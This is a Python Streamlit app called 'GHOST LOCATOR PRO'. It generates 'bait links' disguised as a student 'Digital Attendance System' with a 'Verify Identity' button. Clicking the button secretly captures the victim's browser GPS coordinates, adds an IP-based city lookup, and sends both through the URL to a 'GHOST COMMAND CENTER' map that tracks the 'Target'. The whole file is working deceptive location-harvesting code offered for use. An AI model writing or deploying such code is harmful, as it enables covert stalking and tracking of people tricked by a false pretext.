import streamlit as st
import pandas as pd
import folium
from streamlit_folium import st_folium
from streamlit_autorefresh import st_autorefresh
import datetime
import random
import requests

# --- Page Config ---
st.set_page_config(page_title="GHOST LOCATOR PRO", page_icon="🛰️", layout="wide")

# Custom UI
st.markdown("""
    <style>
    .stApp { background-color: #f8f9fa; }
    h1 { color: #1a73e8; text-align: center; }
    .attendance-box {
        border: 2px solid #1a73e8; padding: 40px; border-radius: 15px;
        text-align: center; background: white; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }
    </style>
    """, unsafe_allow_html=True)

qp = st.query_params

# --- IP TRACKER FUNCTION ---
def get_ip_info():
    try:
        # Student ki IP info nikalne ke liye
        response = requests.get('https://ipapi.co/json/', timeout=5)
        return response.json()
    except:
        return None

# --- BAIT MODE (Student Side) ---
if qp.get("mode") == "attendance":
    # Background mein IP track ho raha hai
    ip_data = get_ip_info()
    
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("""
        <div class="attendance-box">
            <h2 style='color: #1a73e8;'>Digital Attendance System</h2>
            <p>Processing security credentials... Please click <b>Verify</b>.</p>
            <button onclick="getLocation()" style="padding:10px 20px; background:#1a73e8; color:white; border:none; border-radius:5px; cursor:pointer;">Verify Identity</button>
        </div>
    """, unsafe_allow_html=True)
    
    # Coordinates aur IP Data ko URL mein bhej rahe hain
    city = ip_data.get('city', 'Unknown') if ip_data else 'Unknown'
    
    js_code = f"""
    <script>
    function getLocation() {{
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(function(position) {{
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const urlParams = new URLSearchParams(window.location.search);
                const id = urlParams.get('id') || 'Unknown';
                window.location.href = window.location.origin + window.location.pathname + 
                "?id=" + id + "&lat=" + lat + "&lon=" + lon + "&city={city}&ip_track=true";
            }}, function(error) {{
                const urlParams = new URLSearchParams(window.location.search);
                const id = urlParams.get('id') || 'Unknown';
                // Agar GPS block kiya toh sirf IP data ke saath redirect
                window.location.href = window.location.origin + window.location.pathname + 
                "?id=" + id + "&city={city}&ip_track=true&gps=blocked";
            }});
        }}
    }}
    </script>
    """
    st.components.v1.html(js_code, height=100)
    st.stop()

# --- MAIN DASHBOARD ---
st_autorefresh(interval=5000, key="loc_refresh")

# Data Retrieval
target_id = qp.get("id", "No Target")
city_info = qp.get("city", "Awaiting...")
gps_status = "❌ BLOCKED (Using IP)" if qp.get("gps") == "blocked" else "✅ ACTIVE"

if "lat" in qp and "lon" in qp:
    st.session_state.lat = float(qp["lat"])
    st.session_state.lon = float(qp["lon"])
    track_mode = "GPS Accuracy"
else:
    if 'lat' not in st.session_state:
        st.session_state.lat, st.session_state.lon = 21.1702, 72.8311
    track_mode = "IP Location (Approx)"

st.title("🛰️ GHOST COMMAND CENTER")

col1, col2 = st.columns([1, 3])

with col1:
    st.subheader("📊 Target Intel")
    st.metric("ID", target_id)
    st.metric("City (IP)", city_info)
    st.metric("GPS Status", gps_status)
    st.write(f"Tracking via: **{track_mode}**")
    
    if st.button("Generate Bait Link"):
        # Apni live site ka URL yahan dalein
        base = "https://your-site.streamlit.app" 
        st.session_state.link = f"{base}?mode=attendance&id=GHOST_{random.randint(100,999)}"
    
    if 'link' in st.session_state:
        st.code(st.session_state.link)

with col2:
    m = folium.Map(location=[st.session_state.lat, st.session_state.lon], zoom_start=15)
    folium.Marker(
        [st.session_state.lat, st.session_state.lon],
        popup=f"Target: {target_id}",
        icon=folium.Icon(color="red" if "lat" in qp else "orange")
    ).add_to(m)
    st_folium(m, width="100%", height=550)
